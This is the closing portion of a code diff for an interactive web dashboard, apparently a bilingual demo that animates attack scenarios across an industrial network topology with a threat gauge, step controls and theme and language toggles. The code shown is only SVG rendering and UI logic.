+    if(isActive){
+      svg += `<circle r="4" fill="${C.red}" opacity="0.9" filter="url(#glow)">
+        <animate attributeName="cx" values="${x1};${x2}" dur="1.8s" repeatCount="indefinite"/>
+        <animate attributeName="cy" values="${y1};${y2}" dur="1.8s" repeatCount="indefinite"/>
+        <animate attributeName="opacity" values="0;0.9;0.9;0" keyTimes="0;0.15;0.85;1" dur="1.8s" repeatCount="indefinite"/>
+      </circle>`;
+    }
+
+    // protocol label on edges from attacker
+    if(e.from === 'attacker'){
+      const mx = (x1+x2)/2, my = (y1+y2)/2;
+      const lbl = e.kind.toUpperCase();
+      const lblColor = isActive ? (isLight?'#A0332A':'#E08577') : color;
+      svg += `<g transform="translate(${mx},${my})">
+        <rect x="-28" y="-10" width="56" height="18" rx="9" fill="${T.surfaceBadge}" stroke="${lblColor}" stroke-width="1.2" opacity="${isActive?1:0.75}"/>
+        <text text-anchor="middle" y="3" fill="${lblColor}" font-family="ui-monospace,Consolas" font-size="10" font-weight="700" letter-spacing="1.4">${lbl}</text>
+      </g>`;
+    }
+  });
+
+  // nodes
+  nodes.forEach(n => {
+    const r = radiusFor(n.id);
+    const rc = ringColor(n.id);
+    const compromised = compromisedNodes.has(n.id);
+    const bgFill = n.id==='attacker' ? 'url(#gAttacker)' : n.zone==='plant' ? 'url(#gStation)' : 'url(#gNode)';
+    const iconKey = n.icon;
+
+    // pulse ring if compromised (other than attacker which is always source)
+    if(compromised && n.id !== 'attacker'){
+      svg += `<circle cx="${n.x}" cy="${n.y}" r="${r+4}" fill="none" stroke="${C.red}" stroke-width="2.4" opacity="0">
+        <animate attributeName="r" from="${r+2}" to="${r+24}" dur="1.5s" repeatCount="indefinite"/>
+        <animate attributeName="opacity" from="1" to="0" dur="1.5s" repeatCount="indefinite"/>
+      </circle>`;
+    }
+
+    // node body
+    svg += `<g filter="url(#softshadow)">`;
+    svg += `<circle cx="${n.x}" cy="${n.y}" r="${r}" fill="${bgFill}" stroke="${rc}" stroke-width="${compromised?2.6:2}"/>`;
+    // inner highlight ring
+    svg += `<circle cx="${n.x}" cy="${n.y}" r="${r-3}" fill="none" stroke="${rc}" stroke-width="0.8" opacity="0.55"/>`;
+    svg += `</g>`;
+
+    // icon
+    svg += `<g transform="translate(${n.x},${n.y})" color="${rc}">${ICONS[iconKey]}</g>`;
+
+    // compromised badge (tiny red dot at top-right)
+    if(compromised && n.id !== 'attacker'){
+      svg += `<g transform="translate(${n.x + r*0.72},${n.y - r*0.72})">
+        <circle r="6.5" fill="${C.red}" stroke="${T.surfaceBadge}" stroke-width="1.8"/>
+        <text text-anchor="middle" y="3" fill="#fff" font-family="ui-monospace,Consolas" font-size="9" font-weight="700">!</text>
+      </g>`;
+    }
+
+    // label + sub
+    const labelY = n.y + r + 16;
+    const compromisedLabel = isLight ? '#A0332A' : '#E08577';
+    const labelShadow = isLight ? 'none' : '0 1px 3px rgba(0,0,0,0.55)';
+    svg += `<text x="${n.x}" y="${labelY}" text-anchor="middle" fill="${compromised?compromisedLabel:T.label}" font-family="Noto Sans,Arial" font-size="13" font-weight="700" style="text-shadow:${labelShadow}">${n.label}</text>`;
+    if(n.sub){
+      svg += `<text x="${n.x}" y="${labelY+14}" text-anchor="middle" fill="${T.subLabel}" font-family="ui-monospace,Consolas" font-size="10.5">${n.sub}</text>`;
+    }
+  });
+
+  // legend (bottom)
+  // legend anchored to the bottom of the *visible* viewBox (dynamic)
+  const legendX = 24, legendY = viewY + viewH - 14;
+  const legendItems = [
+    { c: C.accent,   t:'MQTT' },
+    { c: C.accentHl, t:'OPC-UA' },
+    { c: C.yellow,   t:'SSH' },
+    { c: C.red,      t:'Active attack path', active:true }
+  ];
+  let lx = legendX;
+  const legendActive = isLight ? '#A0332A' : '#E08577';
+  svg += `<g font-family="ui-monospace,Consolas" font-size="11" font-weight="700" fill="${T.legend}" letter-spacing="0.5">`;
+  legendItems.forEach(it => {
+    svg += `<line x1="${lx}" y1="${legendY}" x2="${lx+24}" y2="${legendY}" stroke="${it.c}" stroke-width="3" stroke-linecap="round"/>`;
+    svg += `<text x="${lx+32}" y="${legendY+4}" fill="${it.active ? legendActive : T.legend}">${it.t}</text>`;
+    lx += 36 + it.t.length*7 + 18;
+  });
+  svg += `</g>`;
+
+  svg += `</svg>`;
+  el('topology').innerHTML = svg;
+}
+
+function drawGauge(pct){
+  const container = el('gauge');
+  const value = Math.max(0, Math.min(100, pct));
+  // arc from 135° to 45° (sweeping 270°)
+  const cs0 = getComputedStyle(document.body);
+  const GC = {
+    green:  cs0.getPropertyValue('--green').trim()      || '#4A7A5C',
+    yellow: cs0.getPropertyValue('--yellow').trim()     || '#B88A2A',
+    orange: cs0.getPropertyValue('--orange').trim()     || '#B85C2A',
+    red:    cs0.getPropertyValue('--orange-150').trim() || '#A3342A'
+  };
+  const color = value<40 ? GC.green : value<70 ? GC.yellow : value<90 ? GC.orange : GC.red;
+  const radius = 70, cx=90, cy=88;
+  const start = Math.PI * 0.75;
+  const sweepFull = Math.PI * 1.5;
+  const endFull   = start + sweepFull;
+  const endVal    = start + sweepFull * (value/100);
+
+  function arc(r, a0, a1){
+    const x0 = cx + r*Math.cos(a0), y0 = cy + r*Math.sin(a0);
+    const x1 = cx + r*Math.cos(a1), y1 = cy + r*Math.sin(a1);
+    const large = (a1 - a0) > Math.PI ? 1 : 0;
+    return `M ${x0} ${y0} A ${r} ${r} 0 ${large} 1 ${x1} ${y1}`;
+  }
+
+  const cs = getComputedStyle(document.body);
+  const trackColor = cs.getPropertyValue('--line').trim() || '#1b2b5a';
+  const labelColor = cs.getPropertyValue('--text-dim').trim() || '#6e83ad';
+
+  const svg = `
+    <svg viewBox="0 0 180 170" preserveAspectRatio="xMidYMid meet">
+      <path d="${arc(radius, start, endFull)}" fill="none" stroke="${trackColor}" stroke-width="12" stroke-linecap="round"/>
+      <path d="${arc(radius, start, endVal)}"  fill="none" stroke="${color}" stroke-width="12" stroke-linecap="round">
+        <animate attributeName="stroke-opacity" from="0.85" to="1" dur="1.6s" repeatCount="indefinite" values="0.85;1;0.85"/>
+      </path>
+      ${value>0?`<circle cx="${cx + radius*Math.cos(endVal)}" cy="${cy + radius*Math.sin(endVal)}" r="6" fill="${color}"><animate attributeName="r" values="5;9;5" dur="1.5s" repeatCount="indefinite"/></circle>`:''}
+      <text x="${cx - radius - 6}" y="${cy + 26}" text-anchor="middle" fill="${labelColor}" font-family="ui-monospace,Consolas" font-size="10" font-weight="700">0</text>
+      <text x="${cx + radius + 6}" y="${cy + 26}" text-anchor="middle" fill="${labelColor}" font-family="ui-monospace,Consolas" font-size="10" font-weight="700">100</text>
+    </svg>
+    <div class="label"><div class="val">${value}</div><div class="unit">threat %</div></div>
+  `;
+  container.innerHTML = svg;
+}
+
+/* ============ controllers ============ */
+function setScenario(key){
+  if(!SCENARIOS[key] || state.scenario===key) return;
+  state.scenario = key;
+  state.step = 0;
+  renderSidebar();
+  renderScenarioHero();
+  renderKillchain();
+  renderStep();
+  renderImpact();
+  renderTopology();
+  renderMitigations();
+}
+function setStep(i){
+  const len = SCENARIOS[state.scenario].steps.length;
+  if(i<0 || i>=len) return;
+  state.step = i;
+  renderKillchain();
+  renderStep();
+  renderImpact();
+  renderTopology();
+}
+function nextStep(){
+  const len = SCENARIOS[state.scenario].steps.length;
+  if(state.step < len-1) setStep(state.step+1);
+}
+function prevStep(){ if(state.step>0) setStep(state.step-1); }
+
+/* ============ keyboard ============ */
+window.addEventListener('keydown', e => {
+  if(e.key === 'ArrowRight') nextStep();
+  else if(e.key === 'ArrowLeft') prevStep();
+});
+
+/* ============ responsive re-render on resize ============ */
+let _resizeT = null;
+window.addEventListener('resize', () => {
+  clearTimeout(_resizeT);
+  _resizeT = setTimeout(() => { renderTopology(); renderImpact(); }, 120);
+});
+
+/* ============ clock ============ */
+function tickClock(){
+  const d = new Date();
+  el('clock').textContent = d.toTimeString().substr(0,8);
+}
+setInterval(tickClock, 1000); tickClock();
+
+/* ============ language toggle ============ */
+(function initLang(){
+  const btn = el('langToggle');
+  if(btn){
+    btn.addEventListener('click', () => {
+      state.lang = state.lang === 'es' ? 'en' : 'es';
+      localStorage.setItem('ntt-lang', state.lang);
+      applyI18n();
+      renderSidebar();
+      renderScenarioHero();
+      renderStep();
+      renderMitigations();
+    });
+  }
+})();
+
+/* ============ theme ============ */
+(function initTheme(){
+  const saved = localStorage.getItem('ntt-theme') || 'dark';
+  document.body.dataset.theme = saved;
+  const btn = el('themeToggle');
+  if(btn){
+    btn.addEventListener('click', () => {
+      const next = document.body.dataset.theme === 'light' ? 'dark' : 'light';
+      document.body.dataset.theme = next;
+      localStorage.setItem('ntt-theme', next);
+      // re-render SVG-based visuals so they pick up the new theme tokens
+      renderTopology();
+      renderImpact();
+    });
+  }
+})();
+
+/* ============ init ============ */
+applyI18n();
+renderSidebar();
+renderScenarioHero();
+renderKillchain();
+renderStep();
+renderImpact();
+renderTopology();
+renderMitigations();
+</script>
+</body>
+</html>
